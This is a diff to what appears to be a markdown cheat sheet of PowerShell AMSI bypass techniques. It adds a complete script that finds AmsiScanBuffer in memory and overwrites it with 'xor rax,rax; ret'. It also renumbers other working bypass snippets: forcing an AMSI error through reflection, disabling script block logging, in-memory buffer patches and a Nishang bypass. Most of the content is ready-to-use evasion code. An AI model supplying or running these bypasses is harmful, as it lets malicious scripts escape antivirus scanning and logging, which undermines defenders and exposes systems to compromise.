@@ -46,13 +46,102 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 
     IEX($content)
 
-## 3) Forcing an error
+## 3) Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass
+```
+Write-Host "-- AMSI Patch"
+Write-Host "-- Paul Laîné (@am0nsec)"
+Write-Host ""
+
+$Kernel32 = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Kernel32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string lpLibFileName);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $Kernel32
+
+Class Hunter {
+    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
+        while ($true) {
+            [int]$count = 0
+
+            while ($true) {
+                [IntPtr]$address = [IntPtr]::Add($address, 1)
+                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
+                    $count++
+                    If ($count -eq $egg.Length) {
+                        return [IntPtr]::Subtract($address, $egg.Length - 1)
+                    }
+                } Else { break }
+            }
+        }
+
+        return $address
+    }
+}
+
+[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
+Write-Host "[+] AMSI DLL Handle: $hModule"
+
+[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
+Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"
+
+If ([IntPtr]::Size -eq 8) {
+	Write-Host "[+] 64-bits process"
+    [byte[]]$egg = [byte[]] (
+        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
+        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
+        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
+        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
+        0x57,                   # push    rdi
+        0x41, 0x56,             # push    r14
+        0x41, 0x57,             # push    r15
+        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
+    )
+} Else {
+	Write-Host "[+] 32-bits process"
+    [byte[]]$egg = [byte[]] (
+        0x8B, 0xFF,             # mov     edi,edi
+        0x55,                   # push    ebp
+        0x8B, 0xEC,             # mov     ebp,esp
+        0x83, 0xEC, 0x18,       # sub     esp,18h
+        0x53,                   # push    ebx
+        0x56                    # push    esi
+    )
+}
+[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
+Write-Host "[+] Targeted address: $targetedAddress"
+
+$oldProtectionBuffer = 0
+[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null
+
+$patch = [byte[]] (
+    0x31, 0xC0,    # xor rax, rax
+    0xC3           # ret  
+)
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)
+
+$a = 0
+[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
+
+```
+## 4) Forcing an error
 ```
 $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
 
 [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
 ```
-## 4) Disable Script Logging
+## 5) Disable Script Logging
 ```
 $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
 $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
@@ -62,7 +151,7 @@ $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr
 [Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
 ```
 
-## 5) Amsi Buffer Patch - In memory 
+## 6) Amsi Buffer Patch - In memory 
 ```
 function Bypass-AMSI
 {
@@ -72,7 +161,7 @@ function Bypass-AMSI
     [Bypass.AMSI]::Patch()
 }
 ```
-## 6) Same as 4 but integer Bytes instead of Base64
+## 7) Same as 4 but integer Bytes instead of Base64
 
 ```
 function MyPatch{
@@ -87,7 +176,7 @@ MyPatch;
 Start-Sleep 1;
 ```
 
-## 7) Nishang all in one
+## 8) Nishang all in one
 ```
 function Invoke-AmsiBypass
 {
